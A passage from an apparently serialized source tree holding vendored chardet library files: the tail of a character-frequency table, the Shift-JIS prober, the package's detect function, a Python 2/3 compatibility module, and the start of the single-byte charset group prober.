715,2417,3061,\n 544, 336,3768,2380,1752,4075, 950, 280,2425,4382, 183,2759,3272, 333,4297,2155,\n1688,2356,1444,1039,4540, 736,1177,3349,2443,2368,2144,2225, 565, 196,1482,3406,\n 927,1335,4147, 692, 878,1311,1653,3911,3622,1378,4200,1840,2969,3149,2126,1816,\n2534,1546,2393,2760, 737,2494,  13, 447, 245,2747,  38,2765,2129,2589,1079, 606,\n 360, 471,3755,2890, 404, 848, 699,1785,1236, 370,2221,1023,3746,2074,2026,2023,\n2388,1581,2119, 812,1141,3091,2536,1519, 804,2053, 406,1596,1090, 784, 548,4414,\n1806,2264,2936,1100, 343,4114,5096, 622,3358, 743,3668,1510,1626,5020,3567,2513,\n3195,4115,5627,2489,2991,  24,2065,2697,1087,2719,  48,1634, 315,  68, 985,2052,\n 198,2239,1347,1107,1439, 597,2366,2172, 871,3307, 919,2487,2790,1867, 236,2570,\n1413,3794, 906,3365,3381,1701,1982,1818,1524,2924,1205, 616,2586,2072,2004, 575,\n 253,3099,  32,1365,1182, 197,1714,2454,1201, 554,3388,3224,2748, 756,2587, 250,\n2567,1507,1517,3529,1922,2761,2337,3416,1961,1677,2452,2238,3153, 615, 911,1506,\n1474,2495,1265,1906,2749,3756,3280,2161, 898,2714,1759,3450,2243,2444, 563,  26,\n3286,2266,3769,3344,2707,3677, 611,1402, 531,1028,2871,4548,1375, 261,2948, 835,\n1190,4134, 353, 840,2684,1900,3082,1435,2109,1207,1674, 329,1872,2781,4055,2686,\n2104, 608,3318,2423,2957,2768,1108,3739,3512,3271,3985,2203,1771,3520,1418,2054,\n1681,1153, 225,1627,2929, 162,2050,2511,3687,1954, 124,1859,2431,1684,3032,2894,\n 585,4805,3969,2869,2704,2088,2032,2095,3656,2635,4362,2209, 256, 518,2042,2105,\n3777,3657, 643,2298,1148,1779, 190, 989,3544, 414,  11,2135,2063,2979,1471, 403,\n3678, 126, 770,1563, 671,2499,3216,2877, 600,1179, 307,2805,4937,1268,1297,2694,\n 252,4032,1448,1494,1331,1394, 127,2256, 222,1647,1035,1481,3056,1915,1048, 873,\n3651, 210,  33,1608,2516, 200,1520, 415, 102,   0,3389,1287, 817,  91,3299,2940,\n 836,1814, 549,2197,1396,1669,2987,3582,2297,2848,4528,1070, 687,  20,1819, 121,\n1552,1364,1461,1968,2617,3540,2824,2083, 177, 948,4938,2291, 110,4549,2066, 648,\n3359,1755,2110,2114,4642,4845,1693,3937,3308,1257,1869,2123, 208,1804,3159,2992,\n2531,2549,3361,2418,1350,2347,2800,2568,1291,2036,2680,  72, 842,1990, 212,1233,\n1154,1586,  75,2027,3410,4900,1823,1337,2710,2676, 728,2810,1522,3026,4995, 157,\n 755,1050,4022, 710, 785,1936,2194,2085,1406,2777,2400, 150,1250,4049,1206, 807,\n1910, 534, 529,3309,1721,1660, 274,  39,2827, 661,2670,1578, 925,3248,3815,1094,\n4278,4901,4252,  41,1150,3747,2572,2227,4501,3658,4902,3813,3357,3617,2884,2258,\n 887, 538,4187,3199,1294,2439,3042,2329,2343,2497,1255, 107, 543,1527, 521,3478,\n3568, 194,5062,  15, 961,3870,1241,1192,2664,  66,5215,3260,2111,1295,1127,2152,\n3805,4135, 901,1164,1976, 398,1278, 530,1460, 748, 904,1054,1966,1426,  53,2909,\n 509, 523,2279,1534, 536,1019, 239,1685, 460,2353, 673,1065,2401,3600,4298,2272,\n1272,2363, 284,1753,3679,4064,1695,  81, 815,2677,2757,2731,1386, 859, 500,4221,\n2190,2566, 757,1006,2519,2068,1166,1455, 337,2654,3203,1863,1682,1914,3025,1252,\n1409,1366, 847, 714,2834,2038,3209, 964,2970,1901, 885,2553,1078,1756,3049, 301,\n1572,3326, 688,2130,1996,2429,1805,1648,2930,3421,2750,3652,3088, 262,1158,1254,\n 389,1641,1812, 526,1719, 923,2073,1073,1902, 468, 489,4625,1140, 857,2375,3070,\n3319,2863, 380, 116,1328,2693,1161,2244, 273,1212,1884,2769,3011,1775,1142, 461,\n3066,1200,2147,2212, 790, 702,2695,4222,1601,1058, 434,2338,5153,3640,  67,2360,\n4099,2502, 618,3472,1329, 416,1132, 830,2782,1807,2653,3211,3510,1662, 192,2124,\n 296,3979,1739,1611,3684,  23, 118, 324, 446,1239,1225, 293,2520,3814,3795,2535,\n3116,  17,1074, 467,2692,2201, 387,2922,  45,1326,3055,1645,3659,2817, 958, 243,\n1903,2320,1339,2825,1784,3289, 356, 576, 865,2315,2381,3377,3916,1088,3122,1713,\n1655, 935, 628,4689,1034,1327, 441, 800, 720, 894,1979,2183,1528,5289,2702,1071,\n4046,3572,2399,1571,3281,  79, 761,1103, 327, 134, 758,1899,1371,1615, 879, 442,\n 215,2605,2579, 173,2048,2485,1057,2975,3317,1097,2253,3801,4263,1403,1650,2946,\n 814,4968,3487,1548,2644,1567,1285,   2, 295,2636,  97, 946,3576, 832, 141,4257,\n3273, 760,3821,3521,3156,2607, 949,1024,1733,1516,1803,1920,2125,2283,2665,3180,\n1501,2064,3560,2171,1592, 803,3518,1416, 732,3897,4258,1363,1362,2458, 119,1427,\n 602,1525,2608,1605,1639,3175, 694,3064,  10, 465,  76,2000,4846,4208, 444,3781,\n1619,3353,2206,1273,3796, 740,2483, 320,1723,2377,3660,2619,1359,1137,1762,1724,\n2345,2842,1850,1862, 912, 821,1866, 612,2625,1735,2573,3369,1093, 844,  89, 937,\n 930,1424,3564,2413,2972,1004,3046,3019,2011, 711,3171,1452,4178, 428, 801,1943,\n 432, 445,2811, 206,4136,1472, 730, 349,  73, 397,2802,2547, 998,1637,1167, 789,\n 396,3217, 154,1218, 716,1120,1780,2819,4826,1931,3334,3762,2139,1215,2627, 552,\n3664,3628,3232,1405,2383,3111,1356,2652,3577,3320,3101,1703, 640,1045,1370,1246,\n4996, 371,1575,2436,1621,2210, 984,4033,1734,2638,  16,4529, 663,2755,3255,1451,\n3917,2257,1253,1955,2234,1263,2951, 214,1229, 617, 485, 359,1831,1969, 473,2310,\n 750,2058, 165,  80,2864,2419, 361,4344,2416,2479,1134, 796,3726,1266,2943, 860,\n2715, 938, 390,2734,1313,1384, 248, 202, 877,1064,2854, 522,3907, 279,1602, 297,\n2357, 395,3740, 137,2075, 944,4089,2584,1267,3802,  62,1533,2285, 178, 176, 780,\n2440, 201,3707, 590, 478,1560,4354,2117,1075,  30,  74,4643,4004,1635,1441,2745,\n 776,2596, 238,1077,1692,1912,2844, 605, 499,1742,3947, 241,3053, 980,1749, 936,\n2640,4511,2582, 515,1543,2162,5322,2892,2993, 890,2148,1924, 665,1827,3581,1032,\n 968,3163, 339,1044,1896, 270, 583,1791,1720,4367,1194,3488,3669,  43,2523,1657,\n 163,2167, 290,1209,1622,3378, 550, 634,2508,2510, 695,2634,2384,2512,1476,1414,\n 220,1469,2341,2138,2852,3183,2900,4939,2865,3502,1211,3680, 854,3227,1299,2976,\n3172, 186,2998,1459, 443,1067,3251,1495, 321,1932,3054, 909, 753,1410,1828, 436,\n2441,1119,1587,3164,2186,1258, 227, 231,1425,1890,3200,3942, 247, 959, 725,5254,\n2741, 577,2158,2079, 929, 120, 174, 838,2813, 591,1115, 417,2024,  40,3240,1536,\n1037, 291,4151,2354, 632,1298,2406,2500,3535,1825,1846,3451, 205,1171, 345,4238,\n  18,1163, 811, 685,2208,1217, 425,1312,1508,1175,4308,2552,1033, 587,1381,3059,\n2984,3482, 340,1316,4023,3972, 792,3176, 519, 777,4690, 918, 933,4130,2981,3741,\n  90,3360,2911,2200,5184,4550, 609,3079,2030, 272,3379,2736, 363,3881,1130,1447,\n 286, 779, 357,1169,3350,3137,1630,1220,2687,2391, 747,1277,3688,2618,2682,2601,\n1156,3196,5290,4034,3102,1689,3596,3128, 874, 219,2783, 798, 508,1843,2461, 269,\n1658,1776,1392,1913,2983,3287,2866,2159,2372, 829,4076,  46,4253,2873,1889,1894,\n 915,1834,1631,2181,2318, 298, 664,2818,3555,2735, 954,3228,3117, 527,3511,2173,\n 681,2712,3033,2247,2346,3467,1652, 155,2164,3382, 113,1994, 450, 899, 494, 994,\n1237,2958,1875,2336,1926,3727, 545,1577,1550, 633,3473, 204,1305,3072,2410,1956,\n2471, 707,2134, 841,2195,2196,2663,3843,1026,4940, 990,3252,4997, 368,1092, 437,\n3212,3258,1933,1829, 675,2977,2893, 412, 943,3723,4644,3294,3283,2230,2373,5154,\n2389,2241,2661,2323,1404,2524, 593, 787, 677,3008,1275,2059, 438,2709,2609,2240,\n2269,2246,1446,  36,1568,1373,3892,1574,2301,1456,3962, 693,2276,5216,2035,1143,\n2720,1919,1797,1811,2763,4137,2597,1830,1699,1488,1198,2090, 424,1694, 312,3634,\n3390,4179,3335,2252,1214, 561,1059,3243,2295,2561, 975,5155,2321,2751,3772, 472,\n1537,3282,3398,1047,2077,2348,2878,1323,3340,3076, 690,2906,  51, 369, 170,3541,\n1060,2187,2688,3670,2541,1083,1683, 928,3918, 459, 109,4427, 599,3744,4286, 143,\n2101,2730,2490,  82,1588,3036,2121, 281,1860, 477,4035,1238,2812,3020,2716,3312,\n1530,2188,2055,1317, 843, 636,1808,1173,3495, 649, 181,1002, 147,3641,1159,2414,\n3750,2289,2795, 813,3123,2610,1136,4368,   5,3391,4541,2174, 420, 429,1728, 754,\n1228,2115,2219, 347,2223,2733, 735,1518,3003,2355,3134,1764,3948,3329,1888,2424,\n1001,1234,1972,3321,3363,1672,1021,1450,1584, 226, 765, 655,2526,3404,3244,2302,\n3665, 731, 594,2184, 319,1576, 621, 658,2656,4299,2099,3864,1279,2071,2598,2739,\n 795,3086,3699,3908,1707,2352,2402,1382,3136,2475,1465,4847,3496,3865,1085,3004,\n2591,1084, 213,2287,1963,3565,2250, 822, 793,4574,3187,1772,1789,3050, 595,1484,\n1959,2770,1080,2650, 456, 422,2996, 940,3322,4328,4345,3092,2742, 965,2784, 739,\n4124, 952,1358,2498,2949,2565, 332,2698,2378, 660,2260,2473,4194,3856,2919, 535,\n1260,2651,1208,1428,1300,1949,1303,2942, 433,2455,2450,1251,1946, 614,1269, 641,\n1306,1810,2737,3078,2912, 564,2365,1419,1415,1497,4460,2367,2185,1379,3005,1307,\n3218,2175,1897,3063, 682,1157,4040,4005,1712,1160,1941,1399, 394, 402,2952,1573,\n1151,2986,2404, 862, 299,2033,1489,3006, 346, 171,2886,3401,1726,2932, 168,2533,\n  47,2507,1030,3735,1145,3370,1395,1318,1579,3609,4560,2857,4116,1457,2529,1965,\n 504,1036,2690,2988,2405, 745,5871, 849,2397,2056,3081, 863,2359,3857,2096,  99,\n1397,1769,2300,4428,1643,3455,1978,1757,3718,1440,  35,4879,3742,1296,4228,2280,\n 160,5063,1599,2013, 166, 520,3479,1646,3345,3012, 490,1937,1545,1264,2182,2505,\n1096,1188,1369,1436,2421,1667,2792,2460,1270,2122, 727,3167,2143, 806,1706,1012,\n1800,3037, 960,2218,1882, 805, 139,2456,1139,1521, 851,1052,3093,3089, 342,2039,\n 744,5097,1468,1502,1585,2087, 223, 939, 326,2140,2577, 892,2481,1623,4077, 982,\n3708, 135,2131,  87,2503,3114,2326,1106, 876,1616, 547,2997,2831,2093,3441,4530,\n4314,   9,3256,4229,4148, 659,1462,1986,1710,2046,2913,2231,4090,4880,5255,3392,\n3274,1368,3689,4645,1477, 705,3384,3635,1068,1529,2941,1458,3782,1509, 100,1656,\n2548, 718,2339, 408,1590,2780,3548,1838,4117,3719,1345,3530, 717,3442,2778,3220,\n2898,1892,4590,3614,3371,2043,1998,1224,3483, 891, 635, 584,2559,3355, 733,1766,\n1729,1172,3789,1891,2307, 781,2982,2271,1957,1580,5773,2633,2005,4195,3097,1535,\n3213,1189,1934,5693,3262, 586,3118,1324,1598, 517,1564,2217,1868,1893,4445,3728,\n2703,3139,1526,1787,1992,3882,2875,1549,1199,1056,2224,1904,2711,5098,4287, 338,\n1993,3129,3489,2689,1809,2815,1997, 957,1855,3898,2550,3275,3057,1105,1319, 627,\n1505,1911,1883,3526, 698,3629,3456,1833,1431, 746,  77,1261,2017,2296,1977,1885,\n 125,1334,1600, 525,1798,1109,2222,1470,1945, 559,2236,1186,3443,2476,1929,1411,\n2411,3135,1777,3372,2621,1841,1613,3229, 668,1430,1839,2643,2916, 195,1989,2671,\n2358,1387, 629,3205,2293,5256,4439, 123,1310, 888,1879,4300,3021,3605,1003,1162,\n3192,2910,2010, 140,2395,2859,  55,1082,2012,2901, 662, 419,2081,1438, 680,2774,\n4654,3912,1620,1731,1625,5035,4065,2328, 512,1344, 802,5443,2163,2311,2537, 524,\n3399,  98,1155,2103,1918,2606,3925,2816,1393,2465,1504,3773,2177,3963,1478,4346,\n 180,1113,4655,3461,2028,1698, 833,2696,1235,1322,1594,4408,3623,3013,3225,2040,\n3022, 541,2881, 607,3632,2029,1665,1219, 639,1385,1686,1099,2803,3231,1938,3188,\n2858, 427, 676,2772,1168,2025, 454,3253,2486,3556, 230,1950, 580, 791,1991,1280,\n1086,1974,2034, 630, 257,3338,2788,4903,1017,  86,4790, 966,2789,1995,1696,1131,\n 259,3095,4188,1308, 179,1463,5257, 289,4107,1248,  42,3413,1725,2288, 896,1947,\n 774,4474,4254, 604,3430,4264, 392,2514,2588, 452, 237,1408,3018, 988,4531,1970,\n3034,3310, 540,2370,1562,1288,2990, 502,4765,1147,   4,1853,2708, 207, 294,2814,\n4078,2902,2509, 684,  34,3105,3532,2551, 644, 709,2801,2344, 573,1727,3573,3557,\n2021,1081,3100,4315,2100,3681, 199,2263,1837,2385, 146,3484,1195,2776,3949, 997,\n1939,3973,1008,1091,1202,1962,1847,1149,4209,5444,1076, 493, 117,5400,2521, 972,\n1490,2934,1796,4542,2374,1512,2933,2657, 413,2888,1135,2762,2314,2156,1355,2369,\n 766,2007,2527,2170,3124,2491,2593,2632,4757,2437, 234,3125,3591,1898,1750,1376,\n1942,3468,3138, 570,2127,2145,3276,4131, 962, 132,1445,4196,  19, 941,3624,3480,\n3366,1973,1374,4461,3431,2629, 283,2415,2275, 808,2887,3620,2112,2563,1353,3610,\n 955,1089,3103,1053,  96,  88,4097, 823,3808,1583, 399, 292,4091,3313, 421,1128,\n 642,4006, 903,2539,1877,2082, 596,  29,4066,1790, 722,2157, 130, 995,1569, 769,\n1485, 464, 513,2213, 288,1923,1101,2453,4316, 133, 486,2445,  50, 625, 487,2207,\n  57, 423, 481,2962, 159,3729,1558, 491, 303, 482, 501, 240,2837, 112,3648,2392,\n1783, 362,   8,3433,3422, 610,2793,3277,1390,1284,1654,  21,3823, 734, 367, 623,\n 193, 287, 374,1009,1483, 816, 476, 313,2255,2340,1262,2150,2899,1146,2581, 782,\n2116,1659,2018,1880, 255,3586,3314,1110,2867,2137,2564, 986,2767,5185,2006, 650,\n 158, 926, 762, 881,3157,2717,2362,3587, 306,3690,3245,1542,3077,2427,1691,2478,\n2118,2985,3490,2438, 539,2305, 983, 129,1754, 355,4201,2386, 827,2923, 104,1773,\n2838,2771, 411,2905,3919, 376, 767, 122,1114, 828,2422,1817,3506, 266,3460,1007,\n1609,4998, 945,2612,4429,2274, 726,1247,1964,2914,2199,2070,4002,4108, 657,3323,\n1422, 579, 455,2764,4737,1222,2895,1670, 824,1223,1487,2525, 558, 861,3080, 598,\n2659,2515,1967, 752,2583,2376,2214,4180, 977, 704,2464,4999,2622,4109,1210,2961,\n 819,1541, 142,2284,  44, 418, 457,1126,3730,4347,4626,1644,1876,3671,1864, 302,\n1063,5694, 624, 723,1984,3745,1314,1676,2488,1610,1449,3558,3569,2166,2098, 409,\n1011,2325,3704,2306, 818,1732,1383,1824,1844,3757, 999,2705,3497,1216,1423,2683,\n2426,2954,2501,2726,2229,1475,2554,5064,1971,1794,1666,2014,1343, 783, 724, 191,\n2434,1354,2220,5065,1763,2752,2472,4152, 131, 175,2885,3434,  92,1466,4920,2616,\n3871,3872,3866, 128,1551,1632, 669,1854,3682,4691,4125,1230, 188,2973,3290,1302,\n1213, 560,3266, 917, 763,3909,3249,1760, 868,1958, 764,1782,2097, 145,2277,3774,\n4462,  64,1491,3062, 971,2132,3606,2442, 221,1226,1617, 218, 323,1185,3207,3147,\n 571, 619,1473,1005,1744,2281, 449,1887,2396,3685, 275, 375,3816,1743,3844,3731,\n 845,1983,2350,4210,1377, 773, 967,3499,3052,3743,2725,4007,1697,1022,3943,1464,\n3264,2855,2722,1952,1029,2839,2467,  84,4383,2215, 820,1391,2015,2448,3672, 377,\n1948,2168, 797,2545,3536,2578,2645,  94,2874,1678, 405,1259,3071, 771, 546,1315,\n 470,1243,3083, 895,2468, 981, 969,2037, 846,4181, 653,1276,2928,  14,2594, 557,\n3007,2474, 156, 902,1338,1740,2574, 537,2518, 973,2282,2216,2433,1928, 138,2903,\n1293,2631,1612, 646,3457, 839,2935, 111, 496,2191,2847, 589,3186, 149,3994,2060,\n4031,2641,4067,3145,1870,  37,3597,2136,1025,2051,3009,3383,3549,1121,1016,3261,\n1301, 251,2446,2599,2153, 872,3246, 637, 334,3705, 831, 884, 921,3065,3140,4092,\n2198,1944, 246,2964, 108,2045,1152,1921,2308,1031, 203,3173,4170,1907,3890, 810,\n1401,2003,1690, 506, 647,1242,2828,1761,1649,3208,2249,1589,3709,2931,5156,1708,\n 498, 666,2613, 834,3817,1231, 184,2851,1124, 883,3197,2261,3710,1765,1553,2658,\n1178,2639,2351,  93,1193, 942,2538,2141,4402, 235,1821, 870,1591,2192,1709,1871,\n3341,1618,4126,2595,2334, 603, 651,  69, 701, 268,2662,3411,2555,1380,1606, 503,\n 448, 254,2371,2646, 574,1187,2309,1770, 322,2235,1292,1801, 305, 566,1133, 229,\n2067,2057, 706, 167, 483,2002,2672,3295,1820,3561,3067, 316, 378,2746,3452,1112,\n 136,1981, 507,1651,2917,1117, 285,4591, 182,2580,3522,1304, 335,3303,1835,2504,\n1795,1792,2248, 674,1018,2106,2449,1857,2292,2845, 976,3047,1781,2600,2727,1389,\n1281,  52,3152, 153, 265,3950, 672,3485,3951,4463, 430,1183, 365, 278,2169,  27,\n1407,1336,2304, 209,1340,1730,2202,1852,2403,2883, 979,1737,1062, 631,2829,2542,\n3876,2592, 825,2086,2226,3048,3625, 352,1417,3724, 542, 991, 431,1351,3938,1861,\n2294, 826,1361,2927,3142,3503,1738, 463,2462,2723, 582,1916,1595,2808, 400,3845,\n3891,2868,3621,2254,  58,2492,1123, 910,2160,2614,1372,1603,1196,1072,3385,1700,\n3267,1980, 696, 480,2430, 920, 799,1570,2920,1951,2041,4047,2540,1321,4223,2469,\n3562,2228,1271,2602, 401,2833,3351,2575,5157, 907,2312,1256, 410, 263,3507,1582,\n 996, 678,1849,2316,1480, 908,3545,2237, 703,2322, 667,1826,2849,1531,2604,2999,\n2407,3146,2151,2630,1786,3711, 469,3542, 497,3899,2409, 858, 837,4446,3393,1274,\n 786, 620,1845,2001,3311, 484, 308,3367,1204,1815,3691,2332,1532,2557,1842,2020,\n2724,1927,2333,4440, 567,  22,1673,2728,4475,1987,1858,1144,1597, 101,1832,3601,\n  12, 974,3783,4391, 951,1412,   1,3720, 453,4608,4041, 528,1041,1027,3230,2628,\n1129, 875,1051,3291,1203,2262,1069,2860,2799,2149,2615,3278, 144,1758,3040,  31,\n 475,1680, 366,2685,3184, 311,1642,4008,2466,5036,1593,1493,2809, 216,1420,1668,\n 233, 304,2128,3284, 232,1429,1768,1040,2008,3407,2740,2967,2543, 242,2133, 778,\n1565,2022,2620, 505,2189,2756,1098,2273, 372,1614, 708, 553,2846,2094,2278, 169,\n3626,2835,4161, 228,2674,3165, 809,1454,1309, 466,1705,1095, 900,3423, 880,2667,\n3751,5258,2317,3109,2571,4317,2766,1503,1342, 866,4447,1118,  63,2076, 314,1881,\n1348,1061, 172, 978,3515,1747, 532, 511,3970,   6, 601, 905,2699,3300,1751, 276,\n1467,3725,2668,  65,4239,2544,2779,2556,1604, 578,2451,1802, 992,2331,2624,1320,\n3446, 713,1513,1013, 103,2786,2447,1661, 886,1702, 916, 654,3574,2031,1556, 751,\n2178,2821,2179,1498,1538,2176, 271, 914,2251,2080,1325, 638,1953,2937,3877,2432,\n2754,  95,3265,1716, 260,1227,4083, 775, 106,1357,3254, 426,1607, 555,2480, 772,\n1985, 244,2546, 474, 495,1046,2611,1851,2061,  71,2089,1675,2590, 742,3758,2843,\n3222,1433, 267,2180,2576,2826,2233,2092,3913,2435, 956,1745,3075, 856,2113,1116,\n 451,   3,1988,2896,1398, 993,2463,1878,2049,1341,2718,2721,2870,2108, 712,2904,\n4363,2753,2324, 277,2872,2349,2649, 384, 987, 435, 691,3000, 922, 164,3939, 652,\n1500,1184,4153,2482,3373,2165,4848,2335,3775,3508,3154,2806,2830,1554,2102,1664,\n2530,1434,2408, 893,1547,2623,3447,2832,2242,2532,3169,2856,3223,2078,  49,3770,\n3469, 462, 318, 656,2259,3250,3069, 679,1629,2758, 344,1138,1104,3120,1836,1283,\n3115,2154,1437,4448, 934, 759,1999, 794,2862,1038, 533,2560,1722,2342, 855,2626,\n1197,1663,4476,3127,  85,4240,2528,  25,1111,1181,3673, 407,3470,4561,2679,2713,\n 768,1925,2841,3986,1544,1165, 932, 373,1240,2146,1930,2673, 721,4766, 354,4333,\n 391,2963, 187,  61,3364,1442,1102, 330,1940,1767, 341,3809,4118, 393,2496,2062,\n2211, 105, 331, 300, 439, 913,1332, 626, 379,3304,1557, 328, 689,3952, 309,1555,\n 931, 317,2517,3027, 325, 569, 686,2107,3084,  60,1042,1333,2794, 264,3177,4014,\n1628, 258,3712,   7,4464,1176,1043,1778, 683, 114,1975,  78,1492, 383,1886, 510,\n 386, 645,5291,2891,2069,3305,4138,3867,2939,2603,2493,1935,1066,1848,3588,1015,\n1282,1289,4609, 697,1453,3044,2666,3611,1856,2412,  54, 719,1330, 568,3778,2459,\n1748, 788, 492, 551,1191,1000, 488,3394,3763, 282,1799, 348,2016,1523,3155,2390,\n1049, 382,2019,1788,1170, 729,2968,3523, 897,3926,2785,2938,3292, 350,2319,3238,\n1718,1717,2655,3453,3143,4465, 161,2889,2980,2009,1421,  56,1908,1640,2387,2232,\n1917,1874,2477,4921, 148,  83,3438, 592,4245,2882,1822,1055, 741, 115,1496,1624,\n 381,1638,4592,1020, 516,3214, 458, 947,4575,1432, 211,1514,2926,1865,2142, 189,\n 852,1221,1400,1486, 882,2299,4036, 351,  28,1122, 700,6479,6480,6481,6482,6483,  #last 512\n)\n\n", "thirdparty/chardet/sjisprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .chardistribution import SJISDistributionAnalysis\nfrom .jpcntx import SJISContextAnalysis\nfrom .mbcssm import SJIS_SM_MODEL\nfrom .enums import ProbingState, MachineState\n\n\nclass SJISProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(SJISProber, self).__init__()\n        self.coding_sm = CodingStateMachine(SJIS_SM_MODEL)\n        self.distribution_analyzer = SJISDistributionAnalysis()\n        self.context_analyzer = SJISContextAnalysis()\n        self.reset()\n\n    def reset(self):\n        super(SJISProber, self).reset()\n        self.context_analyzer.reset()\n\n    @property\n    def charset_name(self):\n        return self.context_analyzer.charset_name\n\n    @property\n    def language(self):\n        return \"Japanese\"\n\n    def feed(self, byte_str):\n        for i in range(len(byte_str)):\n            coding_state = self.coding_sm.next_state(byte_str[i])\n            if coding_state == MachineState.ERROR:\n                self.logger.debug('%s %s prober hit error at byte %s',\n                                  self.charset_name, self.language, i)\n                self._state = ProbingState.NOT_ME\n                break\n            elif coding_state == MachineState.ITS_ME:\n                self._state = ProbingState.FOUND_IT\n                break\n            elif coding_state == MachineState.START:\n                char_len = self.coding_sm.get_current_charlen()\n                if i == 0:\n                    self._last_char[1] = byte_str[0]\n                    self.context_analyzer.feed(self._last_char[2 - char_len:],\n                                               char_len)\n                    self.distribution_analyzer.feed(self._last_char, char_len)\n                else:\n                    self.context_analyzer.feed(byte_str[i + 1 - char_len:i + 3\n                                                        - char_len], char_len)\n                    self.distribution_analyzer.feed(byte_str[i - 1:i + 1],\n                                                    char_len)\n\n        self._last_char[0] = byte_str[-1]\n\n        if self.state == ProbingState.DETECTING:\n            if (self.context_analyzer.got_enough_data() and\n               (self.get_confidence() > self.SHORTCUT_THRESHOLD)):\n                self._state = ProbingState.FOUND_IT\n\n        return self.state\n\n    def get_confidence(self):\n        context_conf = self.context_analyzer.get_confidence()\n        distrib_conf = self.distribution_analyzer.get_confidence()\n        return max(context_conf, distrib_conf)\n", "thirdparty/chardet/__init__.py": "######################## BEGIN LICENSE BLOCK ########################\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n\nfrom .compat import PY2, PY3\nfrom .universaldetector import UniversalDetector\nfrom .version import __version__, VERSION\n\n\ndef detect(byte_str):\n    \"\"\"\n    Detect the encoding of the given byte string.\n\n    :param byte_str:     The byte sequence to examine.\n    :type byte_str:      ``bytes`` or ``bytearray``\n    \"\"\"\n    if not isinstance(byte_str, bytearray):\n        if not isinstance(byte_str, bytes):\n            raise TypeError('Expected object of type bytes or bytearray, got: '\n                            '{0}'.format(type(byte_str)))\n        else:\n            byte_str = bytearray(byte_str)\n    detector = UniversalDetector()\n    detector.feed(byte_str)\n    return detector.close()\n", "thirdparty/chardet/compat.py": "######################## BEGIN LICENSE BLOCK ########################\n# Contributor(s):\n#   Dan Blanchard\n#   Ian Cordasco\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nimport sys\n\n\nif sys.version_info < (3, 0):\n    PY2 = True\n    PY3 = False\n    base_str = (str, unicode)\n    text_type = unicode\nelse:\n    PY2 = False\n    PY3 = True\n    base_str = (bytes, str)\n    text_type = str\n", "thirdparty/chardet/sbcsgroupprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 2001\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetgroupprober import CharSetGroupProber\nfrom .sbcharsetprober import SingleByteCharSetProber\nfrom .langcyrillicmodel import (Win1251CyrillicModel, Koi8rModel,\n                                Latin5CyrillicModel, MacCyrillicModel,\n                                Ibm866Model, Ibm855Model)\nfrom .langgreekmodel import Latin7GreekModel, Win1253GreekModel\nfrom .langbulgarianmodel import Latin5BulgarianModel, Win1251BulgarianModel\n# from .langhungarianmodel import Latin2HungarianModel, Win1250HungarianModel\nfrom .langthaimodel import TIS620ThaiModel\nfrom .langhebrewmodel import Win1255HebrewModel\nfrom .hebrewprober import HebrewProber\nfrom .langturkishmodel import Latin5TurkishModel\n\n\nclass SBCSGroupProber(CharSetGroupProber):\n    def __init__(self):\n        super(SBCSGroupProber, self).__init__()\n        self.probers = [\n            SingleByteCharSetProber(Win1251CyrillicModel),\n            SingleByteCharSetProber(Koi8rModel),\n            SingleByteCharSetProber(Latin5CyrillicModel),\n            SingleByteCharSetProber(MacCyrillicModel),\n            SingleByteCharSetProber(Ibm866Model),\n            SingleByteCharSetProber(Ibm855Model),\n            SingleByteCharSetProber(Latin7GreekModel),\n            